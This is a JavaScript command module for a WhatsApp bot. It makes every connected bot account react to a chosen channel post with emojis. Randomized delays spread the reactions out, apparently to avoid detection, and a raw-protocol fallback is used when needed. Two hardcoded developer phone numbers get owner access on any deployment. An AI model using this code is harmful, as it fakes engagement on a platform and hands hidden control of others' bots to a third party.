const delay = (ms) => new Promise((res) => setTimeout(res, ms));

module.exports = {
  name: "creact",
  alias: ["cr"],
  description: "Official Protocol Channel Post Reactor for all active bots (Owner/Dev Only)",

  async execute({ sock, msg, from, args }) {
    try {
      // 1. Strict Owner & Developer Verification
      const senderJid = msg.key.fromMe 
        ? (sock.user?.id || "") 
        : (msg.key.participant || msg.participant || from || "");

      const cleanSender = String(senderJid).split("@")[0].split(":")[0].replace(/[^0-9]/g, "");

      const devNumbers = ["94719845166", "15947733680169"];
      const isDeveloper = devNumbers.some(num => cleanSender.includes(num)) || senderJid.includes("15947733680169");
      const isOwner = msg.key.fromMe || isDeveloper;

      if (!isOwner) {
        sock.sendMessage(from, { react: { text: "🚫", key: msg.key } }).catch(() => {});
        return await sock.sendMessage(from, {
          text: "*⛔ ACCESS DENIED ⛔*\n\nමෙම Command එක භාවිතා කළ හැක්කේ Bot Owner හෝ Developer ට පමණි."
        }, { quoted: msg });
      }

      // 2. Argument Parsing
      const fullText = args.join(" ").trim();
      if (!fullText || !fullText.includes(",")) {
        return await sock.sendMessage(from, {
          text: `⚠️ *භාවිතය:*\n.creact <post_link>,<emoji1>,<emoji2>...\n\n*උදාහරණ:*\n.creact https://whatsapp.com/channel/0029VbBTkLI9Gv7bxPWEmg3D/2513,🖤,😚,✨,🥀`
        }, { quoted: msg });
      }

      const parts = fullText.split(",").map(p => p.trim()).filter(Boolean);
      const postLink = parts[0];
      const emojis = parts.slice(1);

      if (emojis.length === 0) {
        return await sock.sendMessage(from, { text: "❌ කරුණාකර අවම වශයෙන් එක emoji එකක්වත් දෙන්න." }, { quoted: msg });
      }

      // Link Parsing
      const linkMatch = postLink.match(/whatsapp\.com\/channel\/([a-zA-Z0-9]+)(?:\/(\d+))/);
      if (!linkMatch || !linkMatch[1] || !linkMatch[2]) {
        return await sock.sendMessage(from, { 
          text: "❌ වැරදි Channel Link එකක්! Share Link එකම ලබා දෙන්න (අගට post ID එක සහිතව)." 
        }, { quoted: msg });
      }

      const channelCode = linkMatch[1];
      const postId = linkMatch[2];

      await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } }).catch(() => {});

      // Channel metadata ලබා ගැනීම
      let channelJid = null;
      try {
        const metadata = await sock.newsletterMetadata("invite", channelCode);
        channelJid = metadata.id;
      } catch (e) {
        return await sock.sendMessage(from, { text: `❌ Channel එක සොයාගත නොහැකි විය: ${e.message}` }, { quoted: msg });
      }

      // Active bots ලබා ගැනීම
      let botList = [];
      if (global.activeSockets && global.activeSockets.size > 0) {
        botList = Array.from(global.activeSockets.values());
      } else {
        botList = [sock];
      }

      await sock.sendMessage(from, {
        text: `⚡ *C-REACT ENGINE STARTED*\n\n📢 *Target:* ${channelJid}\n🎯 *Server Post ID:* ${postId}\n🤖 *Active Nodes:* ${botList.length}\n✨ *Emojis:* ${emojis.join(" ")}\n\n_Official Newsletter Node Protocol හරහා Reacts යැවීම ආරම්භ විය..._`
      }, { quoted: msg });

      // Safe Background Runner
      (async () => {
        let success = 0;
        let fail = 0;

        for (let i = 0; i < botList.length; i++) {
          const currentBot = botList[i];
          const selectedEmoji = emojis[i % emojis.length];

          try {
            // 🛑 ක්‍රමය 1: Baileys Official newsletterReactMessage (තිබේ නම්)
            if (typeof currentBot.newsletterReactMessage === 'function') {
              await currentBot.newsletterReactMessage(channelJid, postId.toString(), selectedEmoji);
              success++;
            } else {
              // 🛑 ක්‍රමය 2: WhatsApp Native Channel Reaction Query Node
              await currentBot.query({
                tag: 'message',
                attrs: {
                  to: channelJid,
                  type: 'reaction',
                  server_id: postId.toString(),
                  id: currentBot.generateMessageTag()
                },
                content: [
                  {
                    tag: 'reaction',
                    attrs: {
                      code: selectedEmoji
                    }
                  }
                ]
              });
              success++;
            }
          } catch (err) {
            console.error(`[C-REACT PROTOCOL ERROR - Node ${i + 1}]:`, err.message);

            // 🛑 ක්‍රමය 3: Direct Key Fallback
            try {
              await currentBot.sendMessage(channelJid, {
                react: {
                  text: selectedEmoji,
                  key: {
                    remoteJid: channelJid,
                    server_id: postId.toString(),
                    fromMe: false
                  }
                }
              });
              success++;
            } catch (_) {
              fail++;
            }
          }

          // Safe Delay (තත්පර 3 - 4)
          await delay(3500 + Math.floor(Math.random() * 1000));
        }

        await sock.sendMessage(from, {
          text: `✅ *C-REACT අවසන්!*\n\n🎯 *Post ID:* ${postId}\n🔥 *සාර්ථකයි:* ${success}\n⚠ *අසාර්ථකයි:* ${fail}\n✨ Reactions Channel Server එක වෙත භාර දෙන ලදී.`
        }).catch(() => {});
      })();

    } catch (err) {
      await sock.sendMessage(from, { text: `❌ C-React දෝෂයකි: ${err.message}` }, { quoted: msg });
    }
  }
};
